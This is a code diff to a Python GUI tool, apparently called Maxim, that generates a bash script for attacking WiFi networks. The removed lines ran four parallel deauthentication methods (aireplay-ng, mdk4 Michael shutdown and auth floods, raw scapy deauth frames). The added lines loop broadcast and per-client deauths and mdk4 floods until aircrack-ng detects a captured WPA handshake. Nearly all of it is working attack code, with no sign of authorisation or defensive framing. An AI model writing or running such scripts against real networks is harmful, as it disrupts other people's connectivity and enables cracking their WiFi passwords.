@@ -1342,120 +1342,107 @@ class MaximWindow(QMainWindow):
         script.write("echo '══════════════════════════════════════════════════════════'\n")
         script.write("echo\n\n")
 
-        # Create a second virtual monitor interface for deauth
-        # airodump-ng and aireplay-ng CANNOT share one interface — aireplay silently fails
-        # Solution: add a second virtual interface on the same phy for deauth
-        script.write(f"# Get the phy for {iface}\n")
-        script.write(f"PHY=$(iw dev {iface} info 2>/dev/null | grep wiphy | awk '{{print $2}}')\n")
-        script.write(f"DEAUTH_IFACE='{iface}deauth'\n")
-        script.write(f"sudo iw phy phy$PHY interface add $DEAUTH_IFACE type monitor 2>/dev/null\n")
-        script.write(f"sudo ip link set $DEAUTH_IFACE up 2>/dev/null\n")
-        script.write(f"# If virtual iface failed, fall back to sharing {iface}\n")
-        script.write(f"if ! ip link show $DEAUTH_IFACE >/dev/null 2>&1; then\n")
-        script.write(f"  DEAUTH_IFACE='{iface}'\n")
-        script.write(f"  echo '[!] Could not create virtual interface, deauth shares {iface}'\n")
-        script.write(f"else\n")
-        script.write(f"  echo '[OK] Deauth interface: '$DEAUTH_IFACE\n")
-        script.write(f"fi\n\n")
-
-        # Lock deauth interface to the target channel
-        script.write(f"sudo iw dev $DEAUTH_IFACE set channel $CHANNEL 2>/dev/null\n\n")
-
-        # AGGRESSIVE deauth — 3 parallel methods all on $DEAUTH_IFACE
-        script.write("echo '[2/3] Deauthing clients (BRUTAL)...'\n\n")
-
-        # Thread 1: aireplay-ng broadcast — continuous --deauth 0, no sleep
-        script.write("# --- Thread 1: aireplay-ng continuous broadcast deauth ---\n")
-        script.write("(\n")
-        script.write("  sleep 2\n")
-        script.write("  while true; do\n")
-        script.write(f"    sudo aireplay-ng --deauth 0 -a $BSSID $DEAUTH_IFACE 2>/dev/null\n")
-        script.write("    sleep 0.5\n")
-        script.write("  done\n")
-        script.write(") &\n")
-        script.write("DEAUTH_PID1=$!\n\n")
-
-        # Thread 2: targeted per-client deauth — scans CSV for stations
-        script.write("# --- Thread 2: per-client targeted deauth ---\n")
-        script.write("(\n")
-        script.write("  sleep 6\n")
-        script.write("  while true; do\n")
-        script.write(f"    CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
-        script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
-        script.write("      STATIONS=$(grep -i \"$BSSID\" \"$CAP_CSV\" | grep -Ev \"^$BSSID\" | grep -E '^[0-9A-Fa-f]{2}:' | cut -d, -f1 | tr -d ' ' | sort -u)\n")
-        script.write("      for STA in $STATIONS; do\n")
-        script.write("        if [ -n \"$STA\" ]; then\n")
-        script.write(f"          echo \"  >>> Deauth client: $STA\"\n")
-        script.write(f"          sudo aireplay-ng --deauth 0 -a $BSSID -c $STA $DEAUTH_IFACE 2>/dev/null &\n")
-        script.write("          sleep 3\n")
-        script.write("          sudo pkill -P $$ -f \"aireplay.*-c $STA\" 2>/dev/null\n")
-        script.write("        fi\n")
-        script.write("      done\n")
-        script.write("    fi\n")
-        script.write("    sleep 1\n")
-        script.write("  done\n")
-        script.write(") &\n")
-        script.write("DEAUTH_PID2=$!\n\n")
-
-        # Thread 3: mdk4 — deauth + disassoc + EAPOL flood
-        script.write("# --- Thread 3: mdk4 triple attack ---\n")
-        script.write("(\n")
-        script.write("  sleep 3\n")
-        script.write("  if command -v mdk4 >/dev/null 2>&1; then\n")
-        script.write("    echo $BSSID > /tmp/maxim_mdk_target\n")
-        script.write("    while true; do\n")
-        script.write(f"      sudo mdk4 $DEAUTH_IFACE d -B /tmp/maxim_mdk_target -c $CHANNEL 2>/dev/null &\n")
-        script.write("      MDK_PID=$!\n")
-        script.write("      sleep 10\n")
-        script.write("      kill $MDK_PID 2>/dev/null; wait $MDK_PID 2>/dev/null\n")
-        # Michael shutdown (TKIP attack) — causes AP to temporarily shut down WiFi
-        script.write(f"      sudo timeout 8 mdk4 $DEAUTH_IFACE m -t $BSSID 2>/dev/null\n")
-        # Auth flood — overwhelms AP with fake auth requests
-        script.write(f"      sudo timeout 8 mdk4 $DEAUTH_IFACE a -a $BSSID -m 2>/dev/null\n")
-        script.write("    done\n")
-        script.write("  fi\n")
-        script.write(") &\n")
-        script.write("DEAUTH_PID3=$!\n\n")
-
-        # Thread 4: raw scapy-style deauth via tcpreplay/packetforge if available
-        script.write("# --- Thread 4: raw 802.11 deauth frames via scapy ---\n")
-        script.write("(\n")
-        script.write("  sleep 4\n")
-        script.write("  if python3 -c 'from scapy.all import *' 2>/dev/null; then\n")
-        script.write("    while true; do\n")
-        script.write(f"      python3 -c \"\n")
-        script.write("from scapy.all import *\n")
-        script.write("import sys\n")
-        script.write(f"conf.iface='\"$DEAUTH_IFACE\"'\n")
-        script.write("bssid='\"$BSSID\"'\n")
-        script.write("# Broadcast deauth\n")
-        script.write("pkt1 = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)\n")
-        script.write("# Disassociation\n")
-        script.write("pkt2 = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2=bssid,addr3=bssid)/Dot11Disas(reason=8)\n")
-        script.write("sendp([pkt1,pkt2]*500, inter=0.001, verbose=0)\n")
-        script.write(f"\" 2>/dev/null\n")
-        script.write("      sleep 2\n")
-        script.write("    done\n")
-        script.write("  fi\n")
-        script.write(") &\n")
-        script.write("DEAUTH_PID4=$!\n\n")
-
-        script.write("DEAUTH_PIDS=\"$DEAUTH_PID1 $DEAUTH_PID2 $DEAUTH_PID3 $DEAUTH_PID4\"\n\n")
-
-        # Foreground: capture on the MAIN interface (separate from deauth)
-        script.write(f"echo '[3/3] Capturing on {iface} (deauth on '$DEAUTH_IFACE')...'\n")
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface}\n\n")
-        script.write("# Kill all deauth threads and their children\n")
-        script.write("for PID in $DEAUTH_PIDS; do\n")
-        script.write("  kill $PID 2>/dev/null; wait $PID 2>/dev/null\n")
-        script.write("done\n")
-        script.write("sudo pkill -f 'aireplay-ng.*--deauth' 2>/dev/null\n")
-        script.write("sudo pkill -f 'mdk4' 2>/dev/null\n")
-        script.write("# Remove virtual deauth interface\n")
-        script.write(f"if [ \"$DEAUTH_IFACE\" != '{iface}' ]; then\n")
-        script.write("  sudo iw dev $DEAUTH_IFACE del 2>/dev/null\n")
-        script.write("  echo '[OK] Removed deauth interface'\n")
+        # ═══════════════════════════════════════════════════════════
+        #  STEP 1: Test injection FIRST — if adapter can't inject, nothing works
+        # ═══════════════════════════════════════════════════════════
+        script.write(f"echo '[TEST] Testing packet injection on {iface}...'\n")
+        script.write(f"sudo aireplay-ng --test -a $BSSID {iface} 2>&1 | head -20\n")
+        script.write(f"if sudo aireplay-ng --test -a $BSSID {iface} 2>&1 | grep -qi 'injection is working'; then\n")
+        script.write(f"  echo '[OK] Injection works on {iface}!'\n")
+        script.write("else\n")
+        script.write(f"  echo '[!!!] INJECTION FAILED on {iface}!'\n")
+        script.write(f"  echo 'Your adapter may not support injection or monitor mode is broken.'\n")
+        script.write(f"  echo 'Try: sudo airmon-ng check kill && sudo airmon-ng start {iface}'\n")
+        script.write("  echo 'Continuing anyway...'\n")
         script.write("fi\n")
+        script.write("echo\n\n")
+
+        # ═══════════════════════════════════════════════════════════
+        #  STEP 2: Start airodump-ng in BACKGROUND, deauth in FOREGROUND
+        #  aireplay-ng works fine alongside airodump on the SAME interface.
+        #  The trick is airodump must be backgrounded, not aireplay.
+        # ═══════════════════════════════════════════════════════════
+        script.write(f"echo '[2/3] Starting capture in background...'\n")
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface} &>/dev/null &\n")
+        script.write("AIRODUMP_PID=$!\n")
+        script.write("sleep 3\n")
+        script.write("echo \"  airodump-ng running (PID $AIRODUMP_PID)\"\n\n")
+
+        # ═══════════════════════════════════════════════════════════
+        #  STEP 3: BRUTAL deauth loop — visible output, multiple methods
+        #  Runs in foreground so you SEE everything happening
+        # ═══════════════════════════════════════════════════════════
+        script.write("echo '[3/3] DEAUTH ATTACK — all output visible'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write("echo '  Press Ctrl+C when you see WPA handshake in airodump'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write("echo\n\n")
+
+        script.write("ROUND=0\n")
+        script.write("while true; do\n")
+        script.write("  ROUND=$((ROUND+1))\n")
+        script.write("  echo\n")
+        script.write("  echo \"═══ DEAUTH ROUND $ROUND ═══\"\n")
+        script.write("  echo\n\n")
+
+        # Method 1: aireplay-ng broadcast deauth — FULL OUTPUT visible
+        script.write("  echo '>>> [aireplay-ng] Broadcast deauth (200 packets)...'\n")
+        script.write(f"  sudo aireplay-ng --deauth 200 -a $BSSID {iface}\n")
+        script.write("  echo\n\n")
+
+        # Method 2: per-station targeted deauth — read from capture CSV
+        script.write("  echo '>>> [aireplay-ng] Targeted per-client deauth...'\n")
+        script.write(f"  CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
+        script.write("  if [ -n \"$CAP_CSV\" ]; then\n")
+        script.write("    STATIONS=$(grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"^$BSSID\" | grep -i \"$BSSID\" | cut -d, -f1 | tr -d ' ' | sort -u)\n")
+        script.write("    if [ -n \"$STATIONS\" ]; then\n")
+        script.write("      for STA in $STATIONS; do\n")
+        script.write(f"        echo \"  >>> Deauthing client: $STA\"\n")
+        script.write(f"        sudo aireplay-ng --deauth 100 -a $BSSID -c $STA {iface}\n")
+        script.write("      done\n")
+        script.write("    else\n")
+        script.write("      echo '  No clients discovered yet, broadcast only'\n")
+        script.write(f"      sudo aireplay-ng --deauth 500 -a $BSSID {iface}\n")
+        script.write("    fi\n")
+        script.write("  else\n")
+        script.write("    echo '  No CSV yet, heavy broadcast'\n")
+        script.write(f"    sudo aireplay-ng --deauth 500 -a $BSSID {iface}\n")
+        script.write("  fi\n")
+        script.write("  echo\n\n")
+
+        # Method 3: mdk4 if available
+        script.write("  if command -v mdk4 >/dev/null 2>&1; then\n")
+        script.write("    echo '>>> [mdk4] Deauth flood (10s)...'\n")
+        script.write("    echo $BSSID > /tmp/maxim_mdk_target\n")
+        script.write(f"    sudo timeout 10 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL\n")
+        script.write("    echo\n")
+        script.write("    echo '>>> [mdk4] Auth flood (8s)...'\n")
+        script.write(f"    sudo timeout 8 mdk4 {iface} a -a $BSSID -m\n")
+        script.write("    echo\n")
+        script.write("  fi\n\n")
+
+        # Check if handshake was captured
+        script.write(f"  # Check for handshake in captured files\n")
+        script.write(f"  CAP_FILE=$(ls -t '{capture_prefix}'-*.cap 2>/dev/null | head -1)\n")
+        script.write("  if [ -n \"$CAP_FILE\" ]; then\n")
+        script.write("    if aircrack-ng \"$CAP_FILE\" 2>&1 | grep -qE '[1-9][0-9]* handshake'; then\n")
+        script.write("      echo\n")
+        script.write("      echo '══════════════════════════════════════════════════════════'\n")
+        script.write("      echo '  HANDSHAKE CAPTURED!'\n")
+        script.write("      echo '══════════════════════════════════════════════════════════'\n")
+        script.write("      break\n")
+        script.write("    fi\n")
+        script.write("  fi\n\n")
+
+        script.write("  echo \"  Handshake not yet captured. Continuing...\"\n")
+        script.write("  sleep 1\n")
+        script.write("done\n\n")
+
+        # Cleanup
+        script.write("# Stop airodump\n")
+        script.write("kill $AIRODUMP_PID 2>/dev/null; wait $AIRODUMP_PID 2>/dev/null\n")
+        script.write("sudo pkill -f 'aireplay-ng' 2>/dev/null\n")
+        script.write("sudo pkill -f 'mdk4' 2>/dev/null\n")
         # Restore attack adapter to managed mode
         script.write(f"\n# ═══ CLEANUP: restore {iface} to managed mode ═══\n")
         script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
